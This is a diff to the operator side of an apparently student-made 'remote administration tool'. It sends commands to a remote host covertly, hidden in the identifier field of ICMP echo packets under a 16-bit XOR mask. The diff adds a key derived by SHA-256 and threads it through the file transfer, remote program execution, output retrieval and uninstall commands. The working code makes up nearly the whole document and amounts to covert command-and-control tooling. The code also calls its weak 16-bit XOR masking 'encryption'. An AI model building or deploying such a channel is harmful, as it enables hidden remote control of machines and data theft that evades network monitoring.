@@ -5,6 +5,7 @@ Usage:
 """
 
 import argparse
+import hashlib
 import os
 import socket
 import struct
@@ -21,9 +22,8 @@ ACK_TIMEOUT_SECONDS = 5.0
 TCP_ACK_FLAG = 0x10
 
 # Command-channel protocol: command code goes in the ICMP identifier
-# (16 bits, XOR-encrypted with PRE_SHARED_KEY); sequence in the ICMP
-# sequence field in cleartext.
-PRE_SHARED_KEY = 0xA5C3
+# (16 bits, XOR-encrypted with the user-supplied pre-shared key derived
+# via SHA-256); sequence in the ICMP sequence field in cleartext.
 CMD_DISCONNECT = 1
 CMD_TRANSFER_FILE = 2
 CMD_UNINSTALL = 3
@@ -60,6 +60,7 @@ MENU_OPTIONS = (
 @dataclass
 class HostaArgs:
     hostb_ip: str
+    key: str
 
 
 @dataclass
@@ -70,6 +71,7 @@ class Context:
     destination_ip: str = ""
     source_ip: str = ""
     connected: bool = False
+    key: int = 0
 
 
 # ---------------------------------------------------------------------------
@@ -152,12 +154,17 @@ def build_icmp_echo_request(identifier_encrypted, sequence):
     return with_checksum(compute_checksum(with_checksum(0)))
 
 
-def encrypt_identifier(plaintext):
-    return (plaintext ^ PRE_SHARED_KEY) & 0xFFFF
+def derive_key(key_string):
+    digest = hashlib.sha256(key_string.encode("utf-8")).digest()
+    return (digest[0] << 8) | digest[1]
 
 
-def decrypt_identifier(ciphertext):
-    return (ciphertext ^ PRE_SHARED_KEY) & 0xFFFF
+def encrypt_identifier(plaintext, key):
+    return (plaintext ^ key) & 0xFFFF
+
+
+def decrypt_identifier(ciphertext, key):
+    return (ciphertext ^ key) & 0xFFFF
 
 
 def open_raw_send_socket():
@@ -172,7 +179,7 @@ def send_icmp_identifier(send_socket, source_ip, destination_ip, identifier_encr
     send_socket.sendto(ip + icmp, (destination_ip, 0))
 
 
-def wait_for_ack_ready(recv_socket, source_ip, timeout):
+def wait_for_ack_ready(recv_socket, source_ip, key, timeout):
     """Block until an ICMP echo from source_ip carries ACK_READY in the identifier."""
     deadline = time.time() + timeout
     while True:
@@ -195,11 +202,11 @@ def wait_for_ack_ready(recv_socket, source_ip, timeout):
         icmp_type, _code, _chk, identifier, _seq = struct.unpack("!BBHHH", icmp_header)
         if icmp_type != 8:
             continue
-        if decrypt_identifier(identifier) == ACK_READY:
+        if decrypt_identifier(identifier, key) == ACK_READY:
             return True
 
 
-def receive_byte_stream(recv_socket, source_ip, timeout):
+def receive_byte_stream(recv_socket, source_ip, key, timeout):
     """Receive a one-header byte stream (seq=1 size, seq=2..N+1 data) and reassemble."""
     packets: dict[int, int] = {}
     byte_count: int | None = None
@@ -226,7 +233,7 @@ def receive_byte_stream(recv_socket, source_ip, timeout):
         if icmp_type != 8:
             continue
 
-        value = decrypt_identifier(identifier)
+        value = decrypt_identifier(identifier, key)
         packets[sequence] = value
         if sequence == 1:
             byte_count = value
@@ -264,16 +271,19 @@ def parse_arguments(ctx: Context, argv: list[str] | None = None):
         prog="hosta",
         description="Control center for the remote administration tool.",
     )
-    parser.add_argument("-a", dest="hostb_ip", required=True,
+    parser.add_argument("-a", "--address", dest="hostb_ip", required=True,
                         metavar="<hostb_ip>",
                         help="IP address of hostb")
+    parser.add_argument("-k", "--key", dest="key", required=True,
+                        metavar="<key>",
+                        help="pre-shared key string (must match hostb)")
 
     try:
         parsed = parser.parse_args(argv)
     except SystemExit as exc:
         sys.exit(1 if exc.code else 0)
 
-    ctx.args = HostaArgs(hostb_ip=parsed.hostb_ip)
+    ctx.args = HostaArgs(hostb_ip=parsed.hostb_ip, key=parsed.key)
 
 
 def handle_arguments(ctx: Context):
@@ -282,7 +292,11 @@ def handle_arguments(ctx: Context):
     except OSError:
         ctx.error_message = f"invalid ip address: {ctx.args.hostb_ip}"
         handle_error(ctx)
+    if not ctx.args.key:
+        ctx.error_message = "key must be a non-empty string"
+        handle_error(ctx)
     ctx.destination_ip = ctx.args.hostb_ip
+    ctx.key = derive_key(ctx.args.key)
 
 
 def display_menu(ctx: Context) -> str:
@@ -370,7 +384,7 @@ def send_command(ctx: Context, command_code: int):
         handle_error(ctx)
 
     try:
-        identifier = encrypt_identifier(command_code)
+        identifier = encrypt_identifier(command_code, ctx.key)
         sequence = 1
         try:
             send_icmp_identifier(raw_socket, ctx.source_ip, ctx.destination_ip, identifier, sequence)
@@ -451,7 +465,7 @@ def transfer_file(ctx: Context):
         handle_error(ctx)
 
     try:
-        request_identifier = encrypt_identifier(CMD_TRANSFER_FILE)
+        request_identifier = encrypt_identifier(CMD_TRANSFER_FILE, ctx.key)
         try:
             send_icmp_identifier(
                 send_socket, ctx.source_ip, ctx.destination_ip, request_identifier, 1
@@ -486,7 +500,7 @@ def transfer_file(ctx: Context):
             icmp_type, _code, _chk, identifier, _seq = struct.unpack("!BBHHH", icmp_header)
             if icmp_type != 8:
                 continue
-            if decrypt_identifier(identifier) == ACK_READY:
+            if decrypt_identifier(identifier, ctx.key) == ACK_READY:
                 ready = True
                 break
 
@@ -508,7 +522,7 @@ def transfer_file(ctx: Context):
                 try:
                     send_icmp_identifier(
                         send_socket, ctx.source_ip, ctx.destination_ip,
-                        encrypt_identifier(chunk_value), sequence,
+                        encrypt_identifier(chunk_value, ctx.key), sequence,
                     )
                 except OSError as exc:
                     ctx.error_message = f"failed to send {label} packet {sequence}: {exc}"
@@ -522,13 +536,13 @@ def transfer_file(ctx: Context):
         try:
             send_icmp_identifier(
                 send_socket, ctx.source_ip, ctx.destination_ip,
-                encrypt_identifier(filename_length), 1,
+                encrypt_identifier(filename_length, ctx.key), 1,
             )
             if FILE_PACKET_DELAY_SECONDS > 0:
                 time.sleep(FILE_PACKET_DELAY_SECONDS)
             send_icmp_identifier(
                 send_socket, ctx.source_ip, ctx.destination_ip,
-                encrypt_identifier(file_size), 2,
+                encrypt_identifier(file_size, ctx.key), 2,
             )
             if FILE_PACKET_DELAY_SECONDS > 0:
                 time.sleep(FILE_PACKET_DELAY_SECONDS)
@@ -585,7 +599,7 @@ def run_program(ctx: Context):
         try:
             send_icmp_identifier(
                 send_socket, ctx.source_ip, ctx.destination_ip,
-                encrypt_identifier(CMD_RUN_PROGRAM), 1,
+                encrypt_identifier(CMD_RUN_PROGRAM, ctx.key), 1,
             )
         except OSError as exc:
             ctx.error_message = f"failed to send run request: {exc}"
@@ -593,7 +607,7 @@ def run_program(ctx: Context):
             handle_error(ctx)
         print(f"Sent run request (cmd={CMD_RUN_PROGRAM}). Waiting for ready ack...")
 
-        if not wait_for_ack_ready(recv_socket, ctx.destination_ip, READY_TIMEOUT_SECONDS):
+        if not wait_for_ack_ready(recv_socket, ctx.destination_ip, ctx.key, READY_TIMEOUT_SECONDS):
             print("Run failed: no ready ack from hostb.")
             return
         print("hostb is ready. Sending command...")
@@ -601,7 +615,7 @@ def run_program(ctx: Context):
         try:
             send_icmp_identifier(
                 send_socket, ctx.source_ip, ctx.destination_ip,
-                encrypt_identifier(command_length), 1,
+                encrypt_identifier(command_length, ctx.key), 1,
             )
             if FILE_PACKET_DELAY_SECONDS > 0:
                 time.sleep(FILE_PACKET_DELAY_SECONDS)
@@ -613,7 +627,7 @@ def run_program(ctx: Context):
                 chunk_value = (high << 8) | low
                 send_icmp_identifier(
                     send_socket, ctx.source_ip, ctx.destination_ip,
-                    encrypt_identifier(chunk_value), sequence,
+                    encrypt_identifier(chunk_value, ctx.key), sequence,
                 )
                 if FILE_PACKET_DELAY_SECONDS > 0:
                     time.sleep(FILE_PACKET_DELAY_SECONDS)
@@ -625,7 +639,7 @@ def run_program(ctx: Context):
         print(f"Sent {1 + num_command_packets} packets. Waiting for output...")
 
         output_bytes = receive_byte_stream(
-            recv_socket, ctx.destination_ip, OUTPUT_TIMEOUT_SECONDS
+            recv_socket, ctx.destination_ip, ctx.key, OUTPUT_TIMEOUT_SECONDS
         )
         if output_bytes is None:
             print("Run failed: timed out or incomplete output from hostb.")
